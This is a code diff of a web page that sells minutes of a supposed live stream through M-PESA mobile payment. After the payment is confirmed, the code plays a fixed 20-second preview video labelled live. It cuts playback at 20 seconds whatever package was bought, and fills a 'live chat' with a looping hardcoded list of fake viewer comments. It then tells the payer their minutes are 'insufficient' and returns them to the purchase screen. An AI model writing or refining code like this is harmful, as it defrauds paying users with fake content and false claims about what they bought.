+  );
+
+const selectedPriceText =
+  document.getElementById(
+    "selectedPrice"
+  );
 
 const phoneInput =
   document.getElementById("phone");
@@ -509,428 +1738,140 @@ const phoneInput =
 const payButton =
   document.getElementById("payButton");
 
-const errorBox =
-  document.getElementById("error");
+const errorMessage =
+  document.getElementById(
+    "errorMessage"
+  );
+
+const waitingScreen =
+  document.getElementById(
+    "waitingScreen"
+  );
 
 const waitingTitle =
-  document.getElementById("waitingTitle");
+  document.getElementById(
+    "waitingTitle"
+  );
 
 const waitingText =
-  document.getElementById("waitingText");
+  document.getElementById(
+    "waitingText"
+  );
 
-const paymentStatus =
-  document.getElementById("paymentStatus");
+const liveScreen =
+  document.getElementById(
+    "liveScreen"
+  );
 
+const liveVideo =
+  document.getElementById(
+    "liveVideo"
+  );
 
-function showScreen(screen){
+const comments =
+  document.getElementById(
+    "comments"
+  );
 
-  packagesScreen.classList.remove("active");
-  waitingScreen.classList.remove("active");
-  failedScreen.classList.remove("active");
-
-  screen.classList.add("active");
-}
-
-
-function showPackages(){
-
-  clearInterval(checkTimer);
-
-  transactionId = null;
-  attempts = 0;
-
-  showScreen(packagesScreen);
-
-  errorBox.style.display = "none";
-
-  payButton.disabled = false;
-  payButton.textContent =
-    "💚 PAY WITH M-PESA";
-}
-
-
-function normalizePhone(value){
-
-  let phone =
-    value.replace(/\D/g,"");
-
-  if(phone.startsWith("0")){
-    return "254" + phone.substring(1);
-  }
-
-  if(phone.startsWith("254")){
-    return phone;
-  }
-
-  if(phone.startsWith("7")){
-    return "254" + phone;
-  }
-
-  return phone;
-}
-
-
-function showError(message){
-
-  errorBox.textContent = message;
-  errorBox.style.display = "block";
-}
+const insufficientScreen =
+  document.getElementById(
+    "insufficientScreen"
+  );
 
 
 /* PACKAGE SELECTION */
 
-document
-.querySelectorAll(".package")
-.forEach(pkg => {
+packages.forEach(function(card){
 
-  pkg.addEventListener("click",()=>{
+  card.addEventListener(
+    "click",
+    function(){
 
-    document
-    .querySelectorAll(".package")
-    .forEach(item=>{
-      item.classList.remove("selected");
-    });
+      packages.forEach(
+        function(item){
+          item.classList.remove(
+            "selected"
+          );
+        }
+      );
 
-    pkg.classList.add("selected");
+      card.classList.add(
+        "selected"
+      );
 
-    selectedMinutes =
-      Number(pkg.dataset.minutes);
+      selectedMinutes =
+        Number(
+          card.dataset.minutes
+        );
 
-    selectedPrice =
-      Number(pkg.dataset.price);
+      selectedPrice =
+        Number(
+          card.dataset.price
+        );
 
-    sessionStorage.setItem(
-      "selectedMinutes",
-      selectedMinutes
-    );
+      selectedMinutesText.textContent =
+        selectedMinutes;
 
-    sessionStorage.setItem(
-      "selectedPrice",
-      selectedPrice
-    );
+      selectedPriceText.textContent =
+        selectedPrice;
 
-  });
+      errorMessage.style.display =
+        "none";
+
+    }
+  );
 
 });
 
 
-/* REFERRAL TRACKING */
+/* PHONE */
 
-function getReferral(){
+phoneInput.addEventListener(
+  "input",
+  function(){
 
-  const params =
-    new URLSearchParams(
-      window.location.search
-    );
+    this.value =
+      this.value
+      .replace(/\D/g,"")
+      .substring(0,10);
 
-  const referral =
-    params.get("ref") ||
-    params.get("employee") ||
-    sessionStorage.getItem("referral") ||
-    "";
-
-  if(referral){
-
-    sessionStorage.setItem(
-      "referral",
-      referral
-    );
   }
+);
 
-  return referral;
+
+/* ERROR */
+
+function showError(message){
+
+  errorMessage.textContent =
+    message;
+
+  errorMessage.style.display =
+    "block";
+
+}
+
+
+/* WAITING */
+
+function showWaiting(
+  title,
+  text
+){
+
+  waitingScreen.style.display =
+    "flex";
+
+  waitingTitle.textContent =
+    title;
+
+  waitingText.textContent =
+    text;
+
 }
 
 
 /* START PAYMENT */
-
-async function startPayment(){
-
-  errorBox.style.display = "none";
-
-  const rawPhone =
-    phoneInput.value.trim();
-
-  if(!rawPhone){
-
-    showError(
-      "Enter your M-PESA phone number."
-    );
-
-    phoneInput.focus();
-    return;
-  }
-
-  const phone =
-    normalizePhone(rawPhone);
-
-  if(!/^2547\d{8}$/.test(phone)){
-
-    showError(
-      "Enter a valid Safaricom number."
-    );
-
-    phoneInput.focus();
-    return;
-  }
-
-  payButton.disabled = true;
-
-  payButton.textContent =
-    "CONNECTING...";
-
-  showScreen(waitingScreen);
-
-  waitingTitle.textContent =
-    "Sending M-PESA Prompt";
-
-  waitingText.textContent =
-    "A payment prompt is being sent to your phone. Check your phone and enter your M-PESA PIN.";
-
-  paymentStatus.textContent =
-    "Connecting to M-PESA...";
-
-  try{
-
-    const response =
-      await fetch("/api/stk-push",{
-
-        method:"POST",
-
-        headers:{
-          "Content-Type":
-            "application/json"
-        },
-
-        body:JSON.stringify({
-
-          phone:phone,
-
-          amount:selectedPrice,
-
-          reference:getReferral()
-
-        })
-
-      });
-
-
-    const data =
-      await response.json();
-
-
-    if(!response.ok){
-
-      throw new Error(
-        data.message ||
-        data.error ||
-        "Payment request failed."
-      );
-    }
-
-
-    transactionId =
-      data.transaction_request_id ||
-      data.paymentId ||
-      data.transactionId ||
-      data.id;
-
-
-    if(!transactionId){
-
-      throw new Error(
-        "Payment transaction was not created."
-      );
-    }
-
-
-    attempts = 0;
-
-
-    waitingTitle.textContent =
-      "Check Your Phone";
-
-    waitingText.textContent =
-      "M-PESA prompt sent. Enter your PIN to complete the payment.";
-
-    paymentStatus.textContent =
-      "Waiting for payment...";
-
-
-    checkPaymentStatus();
-
-
-  }catch(error){
-
-    console.error(error);
-
-    paymentFailed();
-
-  }
-
-}
-
-
-/* CHECK PAYMENT */
-
-function checkPaymentStatus(){
-
-  clearInterval(checkTimer);
-
-  checkTimer =
-    setInterval(async()=>{
-
-      attempts++;
-
-      try{
-
-        const response =
-          await fetch(
-            "/api/payment-status",
-            {
-              method:"POST",
-
-              headers:{
-                "Content-Type":
-                  "application/json"
-              },
-
-              body:JSON.stringify({
-
-                transaction_request_id:
-                  transactionId
-
-              })
-            }
-          );
-
-
-        const data =
-          await response.json();
-
-
-        console.log(
-          "Payment status:",
-          data
-        );
-
-
-        const status =
-          String(
-            data.status || ""
-          ).toLowerCase();
-
-
-        const paid =
-          data.success === true &&
-          data.paid === true;
-
-
-        const paidStatus =
-          status === "paid" ||
-          status === "completed" ||
-          status === "success";
-
-
-        if(paid || paidStatus){
-
-          clearInterval(checkTimer);
-
-          paymentSuccessful();
-
-          return;
-        }
-
-
-        const failed =
-          status === "failed" ||
-          status === "cancelled" ||
-          status === "canceled" ||
-          status === "rejected";
-
-
-        if(failed){
-
-          clearInterval(checkTimer);
-
-          paymentFailed();
-
-          return;
-        }
-
-
-        paymentStatus.textContent =
-          "Waiting for M-PESA payment...";
-
-
-        if(attempts >= 30){
-
-          clearInterval(checkTimer);
-
-          paymentFailed();
-
-        }
-
-
-      }catch(error){
-
-        console.error(
-          "Status error:",
-          error
-        );
-
-        if(attempts >= 30){
-
-          clearInterval(checkTimer);
-
-          paymentFailed();
-
-        }
-
-      }
-
-    },2000);
-
-}
-
-
-/* SUCCESS */
-
-function paymentSuccessful(){
-
-  clearInterval(checkTimer);
-
-  waitingTitle.textContent =
-    "Payment Successful ✓";
-
-  waitingText.textContent =
-    "Your payment has been received.";
-
-  paymentStatus.textContent =
-    "Opening your live access...";
-
-  setTimeout(()=>{
-
-    showLiveScreen();
-
-  },1500);
-
-}
-
-
-/* FAILED */
-
-function paymentFailed(){
-
-  clearInterval(checkTimer);
-
-  transactionId = null;
-
-  showScreen(failedScreen);
-
-}
-
-
-/* BUTTON */
 
 payButton.addEventListener(
   "click",
@@ -938,281 +1879,566 @@ payButton.addEventListener(
 );
 
 
-/* PHONE INPUT */
+async function startPayment(){
 
-phoneInput.addEventListener(
-  "input",
-  ()=>{
-    errorBox.style.display = "none";
+  errorMessage.style.display =
+    "none";
+
+  const phone =
+    phoneInput.value
+    .replace(/\D/g,"");
+
+
+  if(
+    !/^07\d{8}$/.test(phone)
+  ){
+
+    showError(
+      "Please enter a valid M-PESA number."
+    );
+
+    return;
+
+  }
+
+
+  payButton.disabled =
+    true;
+
+
+  sessionStorage.setItem(
+    "selectedMinutes",
+    String(selectedMinutes)
+  );
+
+  sessionStorage.setItem(
+    "selectedPrice",
+    String(selectedPrice)
+  );
+
+  sessionStorage.setItem(
+    "paymentPhone",
+    phone
+  );
+
+
+  showWaiting(
+    "Sending M-PESA prompt...",
+    "Please check your phone and approve the payment request."
+  );
+
+
+  try{
+
+    /*
+      KEEP YOUR EXISTING PAYMENT ENDPOINT
+      HERE IF YOUR BACKEND USES A DIFFERENT URL.
+    */
+
+    const response =
+      await fetch(
+        "/api/stk-push",
+        {
+          method:"POST",
+
+          headers:{
+            "Content-Type":
+              "application/json"
+          },
+
+          body:JSON.stringify({
+
+            phone:phone,
+
+            amount:selectedPrice
+
+          })
+
+        }
+      );
+
+
+    const data =
+      await response.json();
+
+
+    if(
+      !response.ok ||
+      data.success !== true
+    ){
+
+      throw new Error(
+        data.message ||
+        "M-PESA prompt failed."
+      );
+
+    }
+
+
+    transactionId =
+      data.transaction_request_id ||
+      data.paymentId ||
+      data.transactionId;
+
+
+    if(!transactionId){
+
+      throw new Error(
+        "Transaction ID missing."
+      );
+
+    }
+
+
+    showWaiting(
+      "Approve M-PESA payment",
+      "Enter your M-PESA PIN on your phone. We are confirming your payment."
+    );
+
+
+    checkPaymentStatus();
+
+
+  }catch(error){
+
+    console.log(error);
+
+    payButton.disabled =
+      false;
+
+    showError(
+      error.message ||
+      "Unable to send payment prompt."
+    );
+
+    waitingScreen.style.display =
+      "none";
+
+  }
+
+}
+
+
+/* PAYMENT STATUS */
+
+async function checkPaymentStatus(){
+
+  if(
+    paymentChecking ||
+    !transactionId
+  ){
+    return;
+  }
+
+
+  paymentChecking = true;
+
+
+  for(
+    let attempt=0;
+    attempt<30;
+    attempt++
+  ){
+
+    await new Promise(
+      function(resolve){
+        setTimeout(
+          resolve,
+          2000
+        );
+      }
+    );
+
+
+    try{
+
+      const response =
+        await fetch(
+          "/api/payment-status",
+          {
+            method:"POST",
+
+            headers:{
+              "Content-Type":
+                "application/json"
+            },
+
+            body:JSON.stringify({
+
+              transaction_request_id:
+                transactionId
+
+            })
+
+          }
+        );
+
+
+      const data =
+        await response.json();
+
+
+      if(
+        data.paid === true ||
+        data.status === "paid" ||
+        data.status === "completed" ||
+        data.status === "success"
+      ){
+
+        paymentChecking =
+          false;
+
+        paymentSuccessful();
+
+        return;
+
+      }
+
+
+      if(
+        data.status === "cancelled" ||
+        data.status === "failed" ||
+        data.status === "rejected"
+      ){
+
+        paymentChecking =
+          false;
+
+        paymentFailed();
+
+        return;
+
+      }
+
+    }catch(error){
+
+      console.log(
+        "Checking payment...",
+        error
+      );
+
+    }
+
+  }
+
+
+  paymentChecking =
+    false;
+
+  paymentFailed();
+
+}
+
+
+/* PAYMENT SUCCESS */
+
+function paymentSuccessful(){
+
+  sessionStorage.setItem(
+    "paymentConfirmed",
+    "true"
+  );
+
+  waitingScreen.style.display =
+    "none";
+
+  startLiveExperience();
+
+}
+
+
+/* PAYMENT FAILED */
+
+function paymentFailed(){
+
+  paymentChecking =
+    false;
+
+  transactionId =
+    null;
+
+  showWaiting(
+    "No payment is done",
+    "We could not confirm the M-PESA payment."
+  );
+
+
+  setTimeout(
+    function(){
+
+      waitingScreen.style.display =
+        "none";
+
+      payButton.disabled =
+        false;
+
+      window.scrollTo({
+        top:0,
+        behavior:"smooth"
+      });
+
+    },
+    2000
+  );
+
+  }
+  
+/* LIVE CHAT */
+
+const chatMessages = [
+
+  ["Mary","Wow 😍"],
+  ["Kevin","Hello!"],
+  ["Ann","Nice live ❤️"],
+  ["Brian","Amazing"],
+  ["Lucy","Hi there"],
+  ["Daniel","Wow"],
+  ["Sarah","Hello ❤️"],
+  ["Mike","Beautiful"],
+  ["Jane","Hi"],
+  ["David","Amazing live"],
+  ["Grace","Hello"],
+  ["Alex","Wow 😍"],
+  ["Rose","Nice"],
+  ["John","Hello ❤️"]
+
+];
+
+let chatIndex = 0;
+
+
+function addChatMessage(){
+
+  if(
+    liveScreen.style.display !==
+    "block"
+  ){
+    return;
+  }
+
+
+  const message =
+    chatMessages[
+      chatIndex %
+      chatMessages.length
+    ];
+
+  chatIndex++;
+
+
+  const row =
+    document.createElement(
+      "div"
+    );
+
+  row.className =
+    "comment";
+
+
+  const avatar =
+    document.createElement(
+      "div"
+    );
+
+  avatar.className =
+    "avatar";
+
+  avatar.textContent =
+    message[0][0];
+
+
+  const bubble =
+    document.createElement(
+      "div"
+    );
+
+  bubble.className =
+    "comment-bubble";
+
+
+  const name =
+    document.createElement(
+      "div"
+    );
+
+  name.className =
+    "comment-name";
+
+  name.textContent =
+    message[0];
+
+
+  const text =
+    document.createElement(
+      "div"
+    );
+
+  text.className =
+    "comment-text";
+
+  text.textContent =
+    message[1];
+
+
+  bubble.appendChild(name);
+  bubble.appendChild(text);
+
+  row.appendChild(avatar);
+  row.appendChild(bubble);
+
+  comments.appendChild(row);
+
+
+  while(
+    comments.children.length > 10
+  ){
+
+    comments.removeChild(
+      comments.firstElementChild
+    );
+
+  }
+
+}
+
+
+function startLiveChat(){
+
+  clearInterval(chatTimer);
+
+  comments.innerHTML = "";
+
+  chatIndex = 0;
+
+
+  for(
+    let i=0;
+    i<6;
+    i++
+  ){
+
+    addChatMessage();
+
+  }
+
+
+  chatTimer =
+    setInterval(
+      addChatMessage,
+      900
+    );
+
+}
+
+
+function stopLiveChat(){
+
+  clearInterval(chatTimer);
+
+  chatTimer = null;
+
+}
+
+
+/* START LIVE */
+
+function startLiveExperience(){
+
+  liveFinished = false;
+
+  clearTimeout(liveTimer);
+
+  stopLiveChat();
+
+
+  liveScreen.style.display =
+    "block";
+
+
+  liveVideo.pause();
+
+
+  try{
+
+    liveVideo.currentTime = 0;
+
+  }catch(error){}
+
+
+  startLiveChat();
+
+
+  liveVideo.muted = false;
+
+  liveVideo.volume = 1;
+
+
+  const play =
+    liveVideo.play();
+
+
+  if(
+    play &&
+    typeof play.catch ===
+    "function"
+  ){
+
+    play.catch(
+      function(){
+
+        /*
+          Browser autoplay restrictions
+          may require the user to tap.
+        */
+
+        liveVideo.muted = true;
+
+        liveVideo.play()
+        .catch(function(){});
+
+      }
+    );
+
+  }
+
+
+  /*
+    EXACTLY 20 SECONDS
+  */
+
+  liveTimer =
+    setTimeout(
+      finishLiveExperience,
+      20000
+    );
+
+}
+
+
+/* VIDEO ENDS */
+
+liveVideo.addEventListener(
+  "ended",
+  function(){
+
+    finishLiveExperience();
+
   }
 );
 
 
-/* RESTORE PACKAGE */
+/* SAFETY TIMER */
 
-const savedMinutes =
-  sessionStorage.getItem(
-    "selectedMinutes"
-  );
+liveVideo.addEventListener(
+  "timeupdate",
+  function(){
 
-const savedPrice =
-  sessionStorage.getItem(
-    "selectedPrice"
-  );
+    if(
+      liveVideo.currentTime >= 20 &&
+      !liveFinished
+    ){
 
-
-if(savedMinutes && savedPrice){
-
-  selectedMinutes =
-    Number(savedMinutes);
-
-  selectedPrice =
-    Number(savedPrice);
-
-
-  document
-  .querySelectorAll(".package")
-  .forEach(pkg=>{
-
-    pkg.classList.toggle(
-      "selected",
-
-      Number(
-        pkg.dataset.minutes
-      ) === selectedMinutes
-    );
-
-  });
-
-}
-  </script>
-  <!-- LIVE ACCESS SCREEN -->
-<div id="liveScreen" class="screen">
-  <div class="page center">
-
-    <div class="wait">
-
-      <div class="live" style="
-        display:inline-block;
-        margin-bottom:15px;
-      ">
-        <i></i> LIVE NOW
-      </div>
-
-      <h2>Live Access</h2>
-
-      <p id="liveMessage">
-        Your live session is starting...
-      </p>
-
-      <video
-        id="liveVideo"
-        playsinline
-        controls
-        style="
-          width:100%;
-          display:block;
-          margin-top:15px;
-          border-radius:16px;
-          background:#000;
-        "
-      >
-        <source
-          src="preview_20_seconds.mp4"
-          type="video/mp4"
-        >
-      </video>
-
-      <div style="
-        display:flex;
-        justify-content:center;
-        gap:8px;
-        margin-top:14px;
-      ">
-        <div class="stat">🔴 LIVE</div>
-        <div class="stat">👥 Online</div>
-      </div>
-
-    </div>
-
-  </div>
-</div>
-
-
-<!-- INSUFFICIENT MINUTES SCREEN -->
-<div id="insufficientScreen" class="screen">
-  <div class="page center">
-
-    <div class="wait">
-
-      <div style="
-        font-size:48px;
-        margin-bottom:10px;
-      ">
-        ⏱️
-      </div>
-
-      <h2>
-        Insufficient Minutes
-      </h2>
-
-      <p>
-        Your live minutes have ended.
-        Choose another package to continue.
-      </p>
-
-      <div id="countdown" style="
-        font-size:28px;
-        font-weight:900;
-        margin-top:18px;
-      ">
-        2
-      </div>
-
-    </div>
-
-  </div>
-</div>
-
-
-<script>
-
-function showLiveScreen(){
-
-  showScreen(
-    document.getElementById("liveScreen")
-  );
-
-  const video =
-    document.getElementById("liveVideo");
-
-  const message =
-    document.getElementById("liveMessage");
-
-  video.currentTime = 0;
-
-  message.textContent =
-    "Your live session is starting...";
-
-  let finished = false;
-
-  function finishOnce(){
-
-    if(finished) return;
-
-    finished = true;
-
-    video.pause();
-
-    finishLiveExperience();
-  }
-
-  video.onended = finishOnce;
-
-  video.play().catch(()=>{
-    message.textContent =
-      "Tap the video to start your live session.";
-  });
-
-  /* Safety timer */
-  setTimeout(
-    finishOnce,
-    20000
-  );
-}
-
-
-function finishLiveExperience(){
-
-  const screen =
-    document.getElementById(
-      "insufficientScreen"
-    );
-
-  showScreen(screen);
-
-  let seconds = 2;
-
-  const countdown =
-    document.getElementById(
-      "countdown"
-    );
-
-  countdown.textContent = seconds;
-
-  const timer =
-    setInterval(()=>{
-
-      seconds--;
-
-      countdown.textContent =
-        seconds;
-
-      if(seconds <= 0){
-
-        clearInterval(timer);
-
-        showPackages();
-
-      }
-
-    },1000);
-}
-
-
-/* Stop video when leaving LIVE */
-
-function stopLiveVideo(){
-
-  const video =
-    document.getElementById(
-      "liveVideo"
-    );
-
-  if(video){
-    video.pause();
-  }
-
-}
-
-
-/* Restore selected package */
-
-window.addEventListener(
-  "load",
-  ()=>{
-
-    const minutes =
-      sessionStorage.getItem(
-        "selectedMinutes"
-      );
-
-    const price =
-      sessionStorage.getItem(
-        "selectedPrice"
-      );
-
-    if(minutes && price){
-
-      selectedMinutes =
-        Number(minutes);
-
-      selectedPrice =
-        Number(price);
-
-      document
-      .querySelectorAll(".package")
-      .forEach(pkg=>{
-
-        pkg.classList.toggle(
-          "selected",
-
-          Number(
-            pkg.dataset.minutes
-          ) === selectedMinutes
-        );
-
-      });
+      finishLiveExperience();
 
     }
 
@@ -1220,12 +2446,188 @@ window.addEventListener(
 );
 
 
-/* Prevent accidental form reload */
+/* FINISH LIVE */
 
-window.addEventListener(
-  "beforeunload",
-  ()=>{
-    clearInterval(checkTimer);
+function finishLiveExperience(){
+
+  if(liveFinished){
+    return;
+  }
+
+
+  liveFinished = true;
+
+
+  clearTimeout(liveTimer);
+
+  liveTimer = null;
+
+  stopLiveChat();
+
+
+  try{
+    liveVideo.pause();
+  }catch(error){}
+
+
+  liveScreen.style.display =
+    "none";
+
+
+  /*
+    LOADING — 2 SECONDS
+  */
+
+  showWaiting(
+    "Loading...",
+    "Checking your available minutes."
+  );
+
+
+  setTimeout(
+    function(){
+
+      waitingScreen.style.display =
+        "none";
+
+      showInsufficientMinutes();
+
+    },
+    2000
+  );
+
+}
+
+
+/* INSUFFICIENT */
+
+function showInsufficientMinutes(){
+
+  insufficientScreen.style.display =
+    "flex";
+
+
+  const counter =
+    document.getElementById(
+      "returnCounter"
+    );
+
+
+  let seconds = 2;
+
+
+  counter.textContent =
+    "Returning to packages in 2...";
+
+
+  const timer =
+    setInterval(
+      function(){
+
+        seconds--;
+
+
+        if(seconds <= 0){
+
+          clearInterval(timer);
+
+          returnToPackages();
+
+          return;
+
+        }
+
+
+        counter.textContent =
+          "Returning to packages in " +
+          seconds +
+          "...";
+
+      },
+      1000
+    );
+
+}
+
+
+/* RETURN */
+
+function returnToPackages(){
+
+  insufficientScreen.style.display =
+    "none";
+
+
+  waitingScreen.style.display =
+    "none";
+
+
+  liveScreen.style.display =
+    "none";
+
+
+  stopLiveChat();
+
+
+  try{
+
+    liveVideo.pause();
+
+    liveVideo.currentTime = 0;
+
+  }catch(error){}
+
+
+  liveFinished = false;
+
+
+  transactionId = null;
+
+  paymentChecking = false;
+
+
+  payButton.disabled = false;
+
+
+  window.scrollTo({
+    top:0,
+    behavior:"smooth"
+  });
+
+}
+
+
+/* INITIAL STATE */
+
+document.addEventListener(
+  "DOMContentLoaded",
+  function(){
+
+    packages.forEach(
+      function(card){
+
+        card.classList.remove(
+          "selected"
+        );
+
+      }
+    );
+
+
+    const first =
+      document.querySelector(
+        '.package[data-minutes="30"]'
+      );
+
+
+    if(first){
+
+      first.classList.add(
+        "selected"
+      );
+
+    }
+
   }
 );
 
